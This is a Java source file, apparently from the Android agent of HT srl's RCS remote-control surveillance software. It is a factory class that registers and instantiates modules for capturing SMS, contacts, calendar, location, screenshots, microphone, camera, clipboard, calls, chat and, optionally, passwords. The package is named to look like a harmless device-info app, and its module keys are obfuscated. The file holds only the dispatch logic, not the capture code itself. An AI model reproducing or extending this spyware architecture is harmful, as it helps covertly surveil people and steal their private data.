/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : AgentFactory.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.deviceinfo.module;

import java.util.Enumeration;
import java.util.Hashtable;

import com.android.deviceinfo.Messages;
import com.android.deviceinfo.auto.Cfg;
import com.android.deviceinfo.interfaces.AbstractFactory;
import com.android.deviceinfo.util.Check;

public class FactoryModule implements AbstractFactory<BaseModule, String> {
	private static final String TAG = "FactoryAgent"; //$NON-NLS-1$
	Hashtable<String, Class> factorymap = new Hashtable<String, Class>();
	Hashtable<Class, String> typemap = new Hashtable<Class, String>();

	public FactoryModule() {
		factorymap.put(Messages.getString("c_0"), ModuleMessage.class);
		factorymap.put(Messages.getString("c_1"), ModuleAddressBook.class);
		factorymap.put(Messages.getString("c_2"), ModuleCalendar.class);
		factorymap.put(Messages.getString("c_4"), ModuleDevice.class);
		factorymap.put(Messages.getString("c_5"), ModulePosition.class);
		factorymap.put(Messages.getString("c_6"), ModuleSnapshot.class);
		factorymap.put(Messages.getString("c_7"), ModuleMessage.class);
		factorymap.put(Messages.getString("c_8"), ModuleMic.class);
		factorymap.put(Messages.getString("c_9"), ModuleCamera.class);
		factorymap.put(Messages.getString("c_10"), ModuleClipboard.class);
		factorymap.put(Messages.getString("c_11"), ModuleCrisis.class);
		factorymap.put(Messages.getString("c_12"), ModuleApplication.class);
		factorymap.put(Messages.getString("c_13"), ModuleCall.class);
		factorymap.put(Messages.getString("c_14"), ModuleChat.class);
		if (Cfg.ENABLE_PASSWORD_MODULE) {
			factorymap.put(Messages.getString("c_15"), ModulePassword.class);
		}

		Enumeration<String> en = factorymap.keys();
		while (en.hasMoreElements()) {
			String type = en.nextElement();
			Class cv = factorymap.get(type);
			typemap.put(cv, type);
		}

	}

	public String getType(Class cl) {
		if(typemap.containsKey(cl)){
			return typemap.get(cl);
		}
		return "unknown type";
	}

	/**
	 * mapAgent() Add agent id defined by "key" into the running map. If the
	 * agent is already present, the old object is returned.
	 * 
	 * @param key
	 *            : Agent ID
	 * @return the requested agent or null in case of error
	 */
	public BaseModule create(String type, String subtype) {
		BaseModule a = new NullModule();
		if (factorymap.containsKey(type))

			try {
				Class cl = factorymap.get(type);
				return (BaseModule) cl.newInstance();
			} catch (IllegalAccessException e) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (create) Error: " + e);
				}
			} catch (InstantiationException e) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (create) Error: " + e);
				}
			}

		return a;

	}
}
